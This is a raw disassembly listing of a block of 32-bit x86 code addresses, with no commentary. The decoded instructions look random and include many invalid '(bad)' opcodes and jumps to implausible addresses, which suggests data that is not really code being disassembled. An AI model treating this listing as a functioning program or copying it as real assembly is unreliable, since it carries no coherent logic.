  4163d4:	iret   
  4163d5:	cld    
  4163d6:	call   0xe188d308
  4163db:	lods   eax,DWORD PTR fs:[esi]
  4163dd:	push   es
  4163de:	iret   
  4163df:	add    al,0xa6
  4163e1:	dec    esi
  4163e2:	jno    0x4163fa
  4163e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4163e5:	inc    esi
  4163e6:	(bad)  
  4163e7:	aam    0xbc
  4163e9:	js     0x4163d7
  4163eb:	fstp   TBYTE PTR [eax+0x22]
  4163ee:	lods   eax,DWORD PTR ds:[esi]
  4163ef:	pusha  
  4163f0:	(bad)  
  4163f1:	rcr    BYTE PTR [ecx+0x39],cl
  4163f4:	inc    edi
  4163f5:	xchg   dl,bh
  4163f7:	and    DWORD PTR [esi+0x60],ecx
  4163fa:	xor    edi,ecx
  4163fc:	fwait
  4163fd:	daa    
  4163fe:	add    eax,0x1bccf58
  416403:	mov    ch,0x3e
  416405:	jle    0x416423
  416407:	and    eax,0xeb757b1d
  41640c:	push   es
  41640d:	xchg   edi,eax
  41640e:	jmp    0x4163f7
  416410:	cld    
	...
  416471:	add    BYTE PTR [eax],al
  416473:	add    bl,dh
  416475:	inc    ebx
  416476:	ror    cl,1
  416478:	lock (bad) 
  41647b:	jnp    0x41640b
  41647d:	xor    al,0x5a
  41647f:	xchg   esi,eax
  416480:	out    dx,al
  416481:	xor    DWORD PTR [eax+0xeb59c6],edi
  416487:	add    BYTE PTR ds:0xb000001,al
  41648d:	popa   
  41648e:	jno    0x416485
  416490:	xchg   ebx,eax
  416491:	test   BYTE PTR [edi+ebp*2+0x2569e6a9],dl
  416498:	adc    ch,BYTE PTR [eax]
  41649a:	pusha  
  41649b:	jl     0x41650d
  41649d:	ins    DWORD PTR es:[edi],dx
  41649e:	push   ebp
  41649f:	or     ah,bl
  4164a1:	mov    al,ds:0x60e17830
  4164a6:	cmp    bl,BYTE PTR [ebx-0x1394771b]
  4164ac:	and    DWORD PTR [edi+0x2ff0eb67],ebx
  4164b2:	cmp    al,0x78
  4164b4:	fld    TBYTE PTR [eax+0x4a]
  4164b7:	cwde   
  4164b8:	push   ebp
  4164b9:	sbb    al,0x2b
  4164bb:	aad    0xfe
  4164bd:	prefetch BYTE PTR [eax-0x16]
  4164c1:	and    BYTE PTR [ebp+0x16],bh
  4164c4:	xchg   BYTE PTR [eax],dl
  4164c6:	mov    ah,BYTE PTR [esi-0x48]
  4164c9:	mov    esi,0xe37dfc0
  4164ce:	inc    ebx
  4164cf:	fcmove st,st(2)
  4164d1:	and    al,0xa9
  4164d3:	jns    0x416512
  4164d5:	or     edi,edx
  4164d7:	inc    esi
  4164d8:	push   es
  4164d9:	dec    esi
  4164da:	sbb    BYTE PTR [ebx+0x4c12a274],ch
  4164e0:	add    ecx,esi
  4164e2:	icebp  
  4164e3:	dec    ebp
  4164e4:	gs pop ss
  4164e6:	jbe    0x416481
  4164e8:	data16 sub BYTE PTR [ebx+0xed2a4a8],bl
  4164ef:	dec    edi
  4164f0:	cdq    
  4164f1:	mov    ebp,0x719ea8a5
  4164f6:	jecxz  0x4164f5
  4164f8:	retf   0xaa7
  4164fb:	es popf 
  4164fd:	arpl   dx,sp
  4164ff:	mov    WORD PTR [eax+edi*2],ds
  416502:	ja     0x4164ff
  416504:	push   cs
  416505:	aas    
  416506:	enter  0xae54,0x70
  41650a:	fidivr WORD PTR [ebx-0x2ddc40e6]
  416510:	pop    ebx
  416511:	pop    eax
  416512:	fbstp  TBYTE PTR [ebx-0xaeeb6e9]
  416518:	push   0x2ba59220
  41651d:	ins    DWORD PTR es:[edi],dx
  41651e:	pusha  
  41651f:	jo     0x416576
  416521:	mov    bh,0xba
  416523:	cdq    
  416524:	(bad)  
  416525:	mov    ds,WORD PTR [eax]
  416527:	pop    esi
  416528:	shr    BYTE PTR [esi-0x1123eb4c],1
  41652e:	mov    esi,0xaee91d5f
  416533:	xchg   edx,eax
  416534:	mov    esp,0xfe2b886e
  416539:	sbb    al,0xe8
  41653b:	xor    BYTE PTR [edx+0x57f360d6],bh
  416541:	mov    ah,0xd9
  416543:	iret   
  416544:	cli    
  416545:	retf   0x5701
  416548:	adc    DWORD PTR [esi-0x2c898b5c],eax
  41654e:	cmp    eax,0x1f109631
  416553:	pop    ecx
  416554:	outs   dx,DWORD PTR ds:[esi]
  416555:	sbb    ebx,edx
  416557:	jnp    0x416551
  416559:	sub    eax,0xb70d15f3
  41655e:	cwde   
  41655f:	pop    esi
  416560:	repnz retf 
  416562:	and    ah,ah
  416564:	xchg   DWORD PTR [edi],eax
  416566:	popf   
  416567:	(bad)  
  416568:	xor    eax,edx
  41656a:	sbb    eax,0x593c5154
  41656f:	out    0x61,eax
  416571:	mov    ds:0x9aa0f4e3,eax
  416576:	mov    WORD PTR [edi+0x2654b7f8],es
  41657c:	mov    esi,0x75d32a36
  416581:	mov    BYTE PTR [esi-0x69eac58b],0xe4
  416588:	fwait
  416589:	jo     0x4165ae
  41658b:	push   cs
  41658c:	or     BYTE PTR [edi+0xf0aeab],ch
	...
  4165f2:	add    BYTE PTR [eax],al
  4165f4:	and    eax,0xfff32bd8
  4165f9:	repz std 
  4165fb:	fisub  WORD PTR [esi+0x5e4fbcac]
  416601:	xor    eax,0xec5ecf33
  416606:	add    BYTE PTR [eax],al
  416608:	add    eax,0x51000001
  41660d:	xor    DWORD PTR [edx-0x10152387],edx
  416613:	frstor [esi-0x39]
  416616:	jns    0x41665b
  416618:	and    al,0x3
  41661a:	sub    ecx,0x23cd7be1
  416620:	rcl    cl,0x37
  416623:	mov    al,0x9b
  416625:	add    eax,0x4f0cdbcc
  41662a:	add    esp,esi
  41662c:	and    dl,cl
  41662e:	(bad)  
  41662f:	push   ds
  416630:	stc    
  416631:	pop    edi
  416632:	ja     0x416629
  416634:	and    eax,0x36570633
  416639:	add    eax,0x89d0e235
  41663e:	push   esi
  41663f:	ror    BYTE PTR [edi-0x38],cl
  416642:	repz jecxz 0x416631
  416645:	xor    DWORD PTR [ebx-0x3280b147],ebx
  41664b:	aas    
  41664c:	retf   0xec98
  41664f:	loope  0x4165f0
  416651:	es clc 
  416653:	push   edx
  416654:	push   0xffffffac
  416656:	popf   
  416657:	pop    ebp
  416658:	xor    edx,0xe8bf375
  41665e:	mov    ah,0xb1
  416660:	mov    dh,BYTE PTR [esp+esi*4]
  416663:	xor    DWORD PTR [ebx+0xf],ebx
  416666:	shl    DWORD PTR [ecx+0xb],1
  416669:	outs   dx,BYTE PTR ds:[esi]
  41666a:	shr    BYTE PTR [ecx-0x27],0x28
  41666e:	push   cs
  41666f:	mov    eax,0xb87b800b
  416674:	popa   
  416675:	fadd   st(1),st
  416677:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416678:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416679:	mov    dl,0xc0
  41667b:	enter  0x3727,0x86
  41667f:	rcr    dl,1
  416681:	push   edi
  416682:	mov    bl,0x99
  416684:	popa   
  416685:	ror    DWORD PTR [ebp+0x64667b9a],0x50
  41668c:	(bad)  
  41668d:	adc    edx,eax
  41668f:	adc    DWORD PTR [ecx],0xffffffd9
  416692:	mov    ecx,0xb861ad10
  416697:	cmp    DWORD PTR [edx+0x51],ebx
  41669a:	outs   dx,DWORD PTR ds:[esi]
  41669b:	mov    ebx,0xe7d930b4
  4166a0:	cs pop es
  4166a2:	push   esi
  4166a3:	mov    dh,0xbc
  4166a5:	in     eax,dx
  4166a6:	leave  
  4166a7:	das    
  4166a8:	sbb    eax,0xd6f9f431
  4166ad:	and    dl,dh
  4166af:	jne    0x416675
  4166b1:	sbb    esi,DWORD PTR [ebx+0x33]
  4166b4:	mov    bh,0xd
  4166b6:	and    ch,ch
  4166b8:	adc    al,BYTE PTR [ecx]
  4166ba:	cs xchg ebx,eax
  4166bc:	lods   ax,WORD PTR ds:[esi]
  4166be:	push   0x8202076c
  4166c3:	pop    ebx
  4166c4:	sahf   
  4166c5:	sub    al,0x0
  4166c7:	mov    ch,0xac
  4166c9:	js     0x41669c
  4166cb:	aam    0xa2
  4166cd:	aam    0xb3
  4166cf:	je     0x416709
  4166d1:	sbb    al,0x9
  4166d3:	jmp    0x450e:0xa12a6b75
  4166da:	stc    
  4166db:	add    DWORD PTR [eax],ecx
  4166dd:	mov    ds:0xc3a2f923,eax
  4166e2:	ins    BYTE PTR es:[edi],dx
  4166e3:	call   0x9be8833e
  4166e8:	push   ebp
  4166e9:	mov    DWORD PTR [ebp-0x3a],ecx
  4166ec:	jbe    0x416761
  4166ee:	pop    ebx
  4166ef:	and    BYTE PTR [edx+0x4ef71ee6],al
  4166f5:	js     0x416762
  4166f7:	js     0x4166da
  4166f9:	cs push edx
  4166fb:	or     al,BYTE PTR [edx+edi*2-0x3b]
  4166ff:	retf   
  416700:	mov    esp,0xd589b119
  416705:	fcmovu st,st(4)
  416707:	sbb    ecx,eax
  416709:	jbe    0x4166ae
  41670b:	inc    ecx
  41670c:	pop    esp
  41670d:	stos   DWORD PTR es:[edi],eax
  41670e:	pop    DWORD PTR ss:[edx+0x0]
	...
  416772:	add    BYTE PTR [eax],al
  416774:	(bad)  
  416775:	(bad)  
  416777:	(bad)  
  416778:	(bad)  
  41677a:	out    0xff,eax
  41677c:	sbb    edi,DWORD PTR [esp+ecx*2-0x3a]
  416780:	nop
  416781:	mov    al,0x67
  416783:	mov    ah,0x63
  416785:	in     eax,dx
  416786:	add    BYTE PTR [eax],al
  416788:	add    eax,0x16000001
  41678d:	sub    bl,BYTE PTR [esp+edi*8-0x2f05c37a]
  416794:	fstp   TBYTE PTR [eax+eiz*2]
  416797:	push   ecx
  416798:	add    BYTE PTR ds:0x8278c781,0x5f
  41679f:	test   BYTE PTR [ecx+0x28dae0da],bh
  4167a5:	pop    eax
  4167a6:	cmp    al,0xca
  4167a8:	(bad)  
  4167a9:	xor    DWORD PTR [edx-0x2a47463],esi
  4167af:	adc    eax,0x1b298fe
  4167b4:	add    bh,0x4e
  4167b7:	add    DWORD PTR ds:0xa94b3c3d,ebp
  4167bd:	fistp  QWORD PTR [esi]
  4167bf:	retf   
  4167c0:	out    0x7a,eax
  4167c2:	sub    al,0xe4
  4167c4:	jne    0x416795
  4167c6:	or     eax,0xef62c685
  4167cb:	nop
  4167cc:	mov    gs,WORD PTR [eax+ebx*4+0x7b]
  4167d0:	xchg   ecx,eax
  4167d1:	sub    DWORD PTR [edx],esi
  4167d3:	xor    al,0x5
  4167d5:	push   eax
  4167d6:	fild   DWORD PTR [edi]
  4167d8:	sub    dl,BYTE PTR [ecx+edx*4+0x43057775]
  4167df:	imul   DWORD PTR [esp+ecx*2+0x2f]
  4167e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4167e4:	in     al,dx
  4167e5:	or     eax,0x251d9bcc
  4167ea:	jmp    0x1baccd15
  4167ef:	push   eax
  4167f0:	jecxz  0x416816
  4167f2:	les    ebp,FWORD PTR [edi+eiz*4-0x56]
  4167f6:	adc    esi,ebp
  4167f8:	retf   0xf405
  4167fb:	mov    eax,0xe786d151
  416800:	clc    
  416801:	(bad)  
  416802:	jmp    0x416835
  416804:	xchg   esi,eax
  416805:	inc    ebp
  416806:	loop   0x416884
  416808:	sub    al,0xf3
  41680a:	push   ecx
  41680b:	dec    edi
  41680c:	jns    0x416861
  41680e:	ror    BYTE PTR [ecx-0xe],cl
  416811:	push   edi
  416812:	sub    cl,ch
  416814:	jnp    0x416867
  416816:	fidiv  DWORD PTR ds:0xa3461b5d
  41681c:	sub    cl,bh
  41681e:	stc    
  41681f:	mov    bh,0xb9
  416821:	add    dh,BYTE PTR [ebx]
  416823:	pop    eax
  416824:	lds    ebp,FWORD PTR ds:0x201775b0
  41682a:	mov    bl,0xad
  41682c:	(bad)  
  41682d:	call   0x53e0b6aa
  416832:	mov    ecx,0x9f190c5f
  416837:	fisttp DWORD PTR [eax-0x32]
  41683a:	inc    edx
  41683b:	sub    ecx,DWORD PTR [eax]
  41683d:	and    al,0xf5
  41683f:	pop    ds
  416840:	push   ecx
  416841:	jl     0x41683f
  416843:	dec    esp
  416844:	ret    0x38d7
  416847:	dec    ebp
  416848:	inc    ebp
  416849:	retf   0x35e1
  41684c:	fidivr DWORD PTR [edx]
  41684e:	sub    eax,0x9724af30
  416853:	fsub   st(1),st
  416855:	inc    eax
  416856:	dec    edi
  416857:	jae    0x4167da
  416859:	lods   al,BYTE PTR ds:[esi]
  41685a:	cli    
  41685b:	iret   
  41685c:	ins    BYTE PTR es:[edi],dx
  41685d:	dec    eax
  41685e:	int    0xf5
  416860:	mov    ebp,0x4426a5d9
  416865:	loop   0x4168b7
  416867:	jecxz  0x4167f3
  416869:	xor    DWORD PTR [ebx-0x50],edi
  41686c:	or     eax,0xd30945a4
  416871:	and    BYTE PTR [edi],cl
  416873:	aad    0xc9
  416875:	daa    
  416876:	jge    0x41680a
  416878:	sti    
  416879:	or     bl,BYTE PTR [ecx]
  41687b:	es loopne 0x416847
  41687e:	mov    esi,0xdfdf2a4
  416883:	jge    0x41680c
  416885:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416886:	scas   eax,DWORD PTR es:[edi]
  416887:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416888:	xchg   edi,eax
  416889:	ja     0x4168bd
  41688b:	mul    BYTE PTR [ecx+0x69]
  41688e:	adc    BYTE PTR cs:[eax+eax*1],ah
	...
  4168f2:	add    BYTE PTR [eax],al
  4168f4:	shr    DWORD PTR [edi-0x4810cfa],1
  4168fa:	cmc    
  4168fb:	scas   eax,DWORD PTR es:[edi]
  4168fc:	sub    DWORD PTR [edi-0x5d],edi
  4168ff:	mov    ebp,0x8661c1eb
  416904:	push   0x50000ee
  416909:	add    DWORD PTR [eax],eax
  41690b:	add    BYTE PTR [ebx-0x76f13525],cl
  416911:	dec    eax
  416912:	inc    eax
  416913:	fcom   QWORD PTR [ebx-0x614679b2]
  416919:	mov    eax,ds:0x31322d43
  41691e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41691f:	jae    0x416928
  416921:	add    eax,0x9384cc46
  416926:	aam    0xf6
  416928:	iret   
  416929:	pop    ss
  41692a:	ret    
  41692b:	jno    0x416915
  41692d:	sub    cl,bh
  41692f:	inc    edi
  416930:	outs   dx,BYTE PTR ds:[esi]
  416931:	pop    edi
  416932:	in     eax,0xd4
  416934:	adc    BYTE PTR [ebp+0x22a3b3ef],0x18
  41693b:	add    ah,BYTE PTR [ebx]
  41693d:	test   BYTE PTR [eax],dh
  41693f:	pop    ss
  416940:	or     cl,BYTE PTR [ebp+0x4c]
  416943:	pop    edx
  416944:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416945:	push   esp
  416946:	jmp    FWORD PTR [ebx-0x8]
  416949:	mov    ebp,0xe3ee7d34
  41694e:	jmp    0x9106de58
  416953:	or     DWORD PTR [ecx+ebx*4+0x4a],ebp
  416957:	push   cs
  416958:	or     edi,DWORD PTR [eax]
  41695a:	fld    TBYTE PTR [esp+eiz*2]
  41695d:	or     DWORD PTR [edi+esi*1],edx
  416960:	add    cl,BYTE PTR [edi-0x110c5c4c]
  416966:	pop    esp
  416967:	test   al,0x2f
  416969:	lea    edx,[ecx+0xea05837]
  41696f:	pop    ecx
  416970:	(bad)
  416974:	add    BYTE PTR [eax+0x4a834623],dl
  41697a:	mov    ds:0xa56ebcf1,al
  41697f:	mov    dl,0xda
  416981:	(bad)  
  416983:	xor    BYTE PTR [ebx+0x1],dl
  416986:	push   DWORD PTR [ebp*2+0x43786226]
  41698d:	lsl    ecx,cx
  416990:	iret   
  416991:	xor    edx,DWORD PTR [ebp-0x6d]
  416994:	(bad)
  416998:	adc    cl,BYTE PTR [ebx-0x2e75ad66]
  41699e:	cld    
  41699f:	add    al,0x3a
  4169a1:	jge    0x4169b9
  4169a3:	xchg   ebx,eax
  4169a4:	sahf   
  4169a5:	and    al,BYTE PTR [eax]
  4169a7:	xor    eax,0x5c54bfef
  4169ac:	add    al,0x8c
  4169ae:	mov    esi,0xce3319cc
  4169b3:	mov    bh,0xe7
  4169b5:	add    dh,bl
  4169b7:	push   eax
  4169b8:	hlt    
  4169b9:	shl    eax,1
  4169bb:	mov    dl,0x9c
  4169bd:	pop    ecx
  4169be:	imul   ecx,DWORD PTR [ebp+0x77283e6f],0x2a
  4169c5:	sbb    DWORD PTR [edi-0x5b5e6d15],edi
  4169cb:	int3   
  4169cc:	mov    BYTE PTR [edx-0x49a9b76a],0x57
  4169d3:	push   0xffffff88
  4169d5:	sbb    al,BYTE PTR [esi+eax*4+0x71]
  4169d9:	mov    ds:0x7ba37bee,eax
  4169de:	sbb    esp,eax
  4169e0:	xchg   edx,eax
  4169e1:	lahf   
  4169e2:	cdq    
  4169e3:	out    dx,eax
  4169e4:	xchg   ebx,eax
  4169e5:	pop    ebx
  4169e6:	cs mov bl,ch
  4169e9:	or     edi,DWORD PTR [ecx]
  4169eb:	or     bl,BYTE PTR [bx+0xc]
  4169ef:	pushf  
  4169f0:	mov    bh,BYTE PTR [ebp+0x43]
  4169f3:	loopne 0x416a69
  4169f5:	push   ebx
  4169f6:	ins    DWORD PTR es:[edi],dx
  4169f7:	push   cs
  4169f8:	test   al,0xc6
  4169fa:	out    dx,eax
  4169fb:	or     ebp,edi
  4169fd:	call   0x7441fe0f
  416a02:	std    
  416a03:	fst    DWORD PTR [esi+0x0]
  416a06:	inc    eax
  416a07:	cmp    edx,ebx
  416a09:	cmp    bl,cl
  416a0b:	daa    
  416a0c:	sar    eax,0xb1
  416a0f:	ins    DWORD PTR es:[edi],dx
  416a10:	clc    
	...
  416a71:	add    BYTE PTR [eax],al
  416a73:	add    bl,cl
  416a75:	pusha  
  416a76:	ror    BYTE PTR [ebx+0x60dbbbfb],1
  416a7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a7d:	mov    al,ds:0xc71f0ba3
  416a82:	jle    0x416a52
  416a84:	ins    DWORD PTR es:[edi],dx
  416a85:	out    dx,eax
  416a86:	add    BYTE PTR [eax],al
  416a88:	add    eax,0x10000001
  416a8d:	adc    ch,ah
  416a8f:	push   ebx
  416a90:	sub    DWORD PTR [ecx+0xd],edx
  416a93:	sbb    ebx,ebx
  416a95:	xchg   BYTE PTR [edx-0x73],dh
  416a98:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416a99:	les    esi,FWORD PTR [edi+0xa047a9]
  416a9f:	jnp    0x416a69
  416aa1:	call   0x229:0x3bfe0aa8
  416aa8:	out    0xc1,eax
  416aaa:	pop    ebp
  416aab:	sti    
  416aac:	mov    dl,0x1
  416aae:	xor    eax,0x24419c73
  416ab3:	push   edi
  416ab4:	xlat   BYTE PTR ds:[ebx]
  416ab5:	mov    BYTE PTR [ecx-0xe],al
  416ab8:	add    dl,0xb
  416abb:	cld    
  416abc:	psubsw mm6,QWORD PTR [esi]
  416abf:	into   
  416ac0:	retf   
  416ac1:	(bad)  
  416ac2:	sub    al,0x54
  416ac4:	or     DWORD PTR [ebx+0x7b],esp
  416ac7:	in     al,0x38
  416ac9:	pop    esp
  416aca:	jne    0x416b17
  416acc:	jne    0x416aa9
  416ace:	fld    QWORD PTR [ebx]
  416ad0:	in     al,0xc2
  416ad2:	lahf   
  416ad3:	(bad)  [ecx-0x58bd77e0]
  416ad9:	cli    
  416ada:	or     esp,0xb9c6e188
  416ae0:	or     BYTE PTR [esi-0x56fcb074],ch
  416ae6:	(bad)
  416ae9:	mov    esi,0xee8c8faa
  416aee:	sub    BYTE PTR [edx],bl
  416af0:	emms   
  416af2:	and    BYTE PTR [ecx+0x7],ch
  416af5:	fwait
  416af6:	ins    DWORD PTR es:[edi],dx
  416af7:	sub    BYTE PTR [ecx-0x73],bh
  416afa:	outs   dx,BYTE PTR ds:[esi]
  416afb:	loopne 0x416b7c
  416afd:	add    al,0xbe
  416aff:	ds pusha 
  416b01:	test   al,0x7a
  416b03:	jnp    0x416b04
  416b05:	enter  0x89b,0x16
  416b09:	int    0x70
  416b0b:	loopne 0x416b7e
  416b0d:	push   0xdfba1673
  416b12:	add    eax,DWORD PTR ds:0xfcc469d6
  416b18:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416b19:	xor    eax,0xa03c1dd1
  416b1e:	push   0xe44667a3
  416b23:	into   
  416b24:	pop    es
  416b25:	push   0x724f9ad9
  416b2a:	stos   BYTE PTR es:[edi],al
  416b2b:	lea    ebp,[edx-0x69]
  416b2e:	cld    
  416b2f:	pusha  
  416b30:	mov    al,BYTE PTR [esi+0x1172cdef]
  416b36:	dec    edx
  416b37:	clc    
  416b38:	outs   dx,DWORD PTR ds:[esi]
  416b39:	daa    
  416b3a:	and    eax,0x69419301
  416b3f:	call   0xc2bf316b
  416b44:	mov    ebx,0x20e40ece
  416b49:	jecxz  0x416bc5
  416b4b:	mov    cl,0xd6
  416b4d:	aaa    
  416b4e:	pop    ecx
  416b4f:	add    eax,0x5fd46e9f
  416b54:	or     eax,0xb1d99832
  416b59:	scas   eax,DWORD PTR es:[edi]
  416b5a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416b5b:	mov    esi,DWORD PTR [ebx+ebx*1-0x4f]
  416b5f:	sahf   
  416b60:	cs sahf 
  416b62:	jo     0x416b9c
  416b64:	add    eax,0xedc21e6e
  416b69:	test   al,0xcf
  416b6b:	mov    cs,WORD PTR [ebp-0x69]
  416b6e:	xchg   esp,eax
  416b6f:	xchg   ebx,eax
  416b70:	mov    eax,ds:0xfc40a349
  416b75:	sti    
  416b76:	sbb    ah,BYTE PTR [ebx+0x36]
  416b79:	pop    esi
  416b7a:	bound  edx,QWORD PTR [eax+0x439ad6f5]
  416b80:	mov    bh,0x61
  416b82:	dec    edx
  416b83:	aad    0x4f
  416b85:	fdivr  QWORD PTR [edx]
  416b87:	or     BYTE PTR [eax-0x7c],cl
  416b8a:	cwde   
  416b8b:	inc    ebp
  416b8c:	sub    al,0xd5
  416b8e:	sub    cl,BYTE PTR [edx+0x19]
	...
  416bf1:	add    BYTE PTR [eax],al
  416bf3:	add    bl,ah
  416bf5:	gs push cs
  416bf7:	test   DWORD PTR [esi-0x38a0401],0x545b70a9
  416c01:	(bad)  
  416c02:	adc    edx,edx
  416c04:	jb     0x416bf6
  416c06:	add    BYTE PTR [eax],al
  416c08:	add    eax,0x6f000001
  416c0d:	inc    ecx
  416c0e:	stos   DWORD PTR es:[edi],eax
  416c0f:	jae    0x416c77
  416c11:	mov    dh,0x36
  416c13:	in     al,dx
  416c14:	cmp    al,0x2b
  416c16:	mov    dl,0x3f
  416c18:	adc    DWORD PTR [ecx-0x30e869c2],esi
  416c1e:	test   BYTE PTR [ebx],ch
  416c20:	xchg   BYTE PTR [esi+0x5e],cl
  416c23:	push   edx
  416c24:	lea    ebx,[ebp+0x2729995f]
  416c2a:	dec    ecx
  416c2b:	sbb    eax,0xdd1010b4
  416c30:	add    ah,BYTE PTR ds:0xfa4c7921
  416c36:	ds pop edx
  416c38:	out    dx,al
  416c39:	stos   BYTE PTR es:[edi],al
  416c3a:	push   0xceca8a97
  416c3f:	imul   ebx,DWORD PTR [edx+0x30ac8b25],0xffffff96
  416c46:	aam    0x66
  416c48:	sbb    bl,bh
  416c4a:	mov    ebp,DWORD PTR [ebx]
  416c4c:	adc    bl,0xc4
  416c4f:	rcr    DWORD PTR [esi+0x443722c7],cl
  416c55:	fist   WORD PTR [ebp-0x4c30b4ca]
  416c5b:	test   DWORD PTR [esi+0x65],0x57994672
  416c62:	mov    esp,edi
  416c64:	add    DWORD PTR [eax+0x37],ebp
  416c67:	cmp    ch,BYTE PTR [edx-0x23d85cbb]
  416c6d:	push   ebx
  416c6e:	or     eax,0xe769b626
  416c73:	xchg   esp,eax
  416c74:	xchg   edi,eax
  416c75:	pop    esi
  416c76:	add    ch,ch
  416c78:	outs   dx,BYTE PTR ds:[esi]
  416c79:	and    edx,DWORD PTR [ebx-0x4c1f7329]
  416c7f:	int3   
  416c80:	add    eax,ebp
  416c82:	xor    DWORD PTR [ebx+edx*4],esp
  416c85:	je     0x416c31
  416c87:	cdq    
  416c88:	jb     0x416c16
  416c8a:	cmp    DWORD PTR [esi],ebp
  416c8c:	jecxz  0x416c7b
  416c8e:	mov    dl,0x85
  416c90:	push   0x69
  416c92:	or     al,0x8c
  416c94:	xor    ecx,0x1
  416c97:	sub    BYTE PTR [eax],bl
  416c99:	sub    ch,BYTE PTR [esi]
  416c9b:	xor    al,0x2c
  416c9d:	arpl   WORD PTR [ecx+0x3d],sp
  416ca0:	and    DWORD PTR [ebx+eax*8-0x4b4374f9],ebp
  416ca7:	sub    esi,eax
  416ca9:	ret    0x9ca3
  416cac:	inc    ebx
  416cad:	add    eax,0xb898b2ec
  416cb2:	sbb    eax,0xbec5d111
  416cb7:	push   edx
  416cb8:	rcr    BYTE PTR [edx],0xf3
  416cbb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416cbc:	adc    esp,DWORD PTR [eax-0x4]
  416cbf:	aad    0xe5
  416cc1:	out    0x6f,eax
  416cc3:	mov    gs,WORD PTR ds:0x7a65d14b
  416cc9:	and    BYTE PTR [ebx-0xd8991b3],cl
  416ccf:	sbb    BYTE PTR [edi-0x126d95a2],0x93
  416cd6:	jae    0x416d3a
  416cd8:	mov    esp,0xc698e6a6
  416cdd:	sub    BYTE PTR [ecx+0x24],dl
  416ce0:	mov    ch,BYTE PTR [ebx+0x36]
  416ce3:	sbb    ecx,edi
  416ce5:	and    esp,edx
  416ce7:	inc    edx
  416ce8:	xlat   BYTE PTR ds:[ebx]
  416ce9:	mov    bh,BYTE PTR [ecx-0x21f97d49]
  416cef:	push   esp
  416cf0:	or     edi,DWORD PTR [esi+0x18]
  416cf3:	pop    es
  416cf4:	stos   BYTE PTR es:[edi],al
  416cf5:	mov    ds:0x81c4b0bb,al
  416cfa:	in     al,dx
  416cfb:	outs   dx,BYTE PTR ds:[esi]
  416cfc:	push   DWORD PTR [edi-0x254eff4f]
  416d02:	addr16 mov edx,esp
  416d05:	scas   al,BYTE PTR es:[edi]
  416d06:	sub    DWORD PTR [eax-0x2a],ebx
  416d09:	and    al,BYTE PTR [ebx-0x220f3001]
  416d0f:	pop    eax
  416d10:	jge    0x416d12
	...
  416d72:	add    BYTE PTR [eax],al
  416d74:	and    DWORD PTR [ebx-0x40445077],edx
  416d7a:	daa    
  416d7b:	lahf   
  416d7c:	mov    ch,0x99
  416d7e:	pop    edx
  416d7f:	das    
  416d80:	fs mov al,dh
  416d83:	in     eax,0x77
  416d85:	icebp  
  416d86:	add    BYTE PTR [eax],al
  416d88:	add    eax,0xf0000001
  416d8d:	xchg   ebx,eax
  416d8e:	and    DWORD PTR [esi-0x4980bb34],0x548648fc
  416d98:	in     al,0x7a
  416d9a:	cwde   
  416d9b:	repnz push 0x86d94be9
  416da1:	cmp    DWORD PTR [edx+0x62152fc5],esp
  416da7:	nop
  416da8:	push   ecx
  416da9:	mov    BYTE PTR [edx-0x24b913cd],dh
  416daf:	dec    edx
  416db0:	adc    DWORD PTR [eax-0x2166bba6],esi
  416db6:	das    
  416db7:	add    BYTE PTR [ebx+0x776b5ce9],dh
  416dbd:	outs   dx,BYTE PTR ds:[esi]
  416dbe:	push   ss
  416dbf:	xchg   edi,eax
  416dc0:	jbe    0x416e18
  416dc2:	fst    DWORD PTR [edx+0x4a47afc6]
  416dc8:	ja     0x416d50
  416dca:	dec    edx
  416dcb:	and    ebp,edx
  416dcd:	push   ecx
  416dce:	and    eax,esi
  416dd0:	loope  0x416e18
  416dd2:	and    eax,0x9b60d7a2
  416dd7:	psubd  mm0,QWORD PTR [esi+0x11]
  416ddb:	imul   ebp,DWORD PTR [edi+0x3d76de83],0xffffffbb
  416de2:	loope  0x416d6e
  416de4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416de5:	adc    ebp,DWORD PTR [ebx+0x446a1029]
  416deb:	adc    bl,cl
  416ded:	and    al,0x77
  416def:	popa   
  416df0:	clc    
  416df1:	retf   
  416df2:	xor    eax,0xd7105c85
  416df7:	push   es
  416df8:	mov    bl,BYTE PTR ds:0x40c44bf4
  416dfe:	mov    eax,ds:0x1903075a
  416e03:	scas   al,BYTE PTR es:[edi]
  416e04:	xor    DWORD PTR [edi-0x3e0d885f],ecx
  416e0a:	rol    dh,cl
  416e0c:	stos   DWORD PTR es:[edi],eax
  416e0d:	stos   DWORD PTR es:[edi],eax
  416e0e:	(bad)  
  416e0f:	sbb    eax,0xbb8d1d0d
  416e14:	imul   ebx,DWORD PTR [ecx-0x20],0x58
  416e18:	push   ecx
  416e19:	test   eax,0x919bb0cd
  416e1e:	(bad)  
  416e1f:	jp     0x416dd5
  416e21:	loope  0x416da7
  416e23:	call   0xc0e6:0xebd7580e
  416e2a:	jns    0x416def
  416e2c:	mov    bh,0x40
  416e2e:	ss mov ah,0xfc
  416e31:	xor    BYTE PTR [eax],cl
  416e33:	inc    ebx
  416e34:	imul   edx,DWORD PTR [ebp+0x61],0xa87f2899
  416e3b:	stos   DWORD PTR es:[di],eax
  416e3d:	dec    ecx
  416e3e:	xor    DWORD PTR [edx-0x32],0xcf16a83e
  416e45:	cmp    dl,BYTE PTR ds:0x26f03426
  416e4b:	xchg   bl,dh
  416e4d:	mov    eax,ds:0x845fba49
  416e52:	enter  0x1614,0x4
  416e56:	int3   
  416e57:	dec    edi
  416e58:	xchg   ecx,eax
  416e59:	aad    0xfa
  416e5b:	inc    ebx
  416e5c:	bound  esp,QWORD PTR [edx]
  416e5e:	(bad)
  416e62:	mov    dl,0xf9
  416e64:	pop    ebp
  416e65:	adc    dh,BYTE PTR ds:0xe6189a05
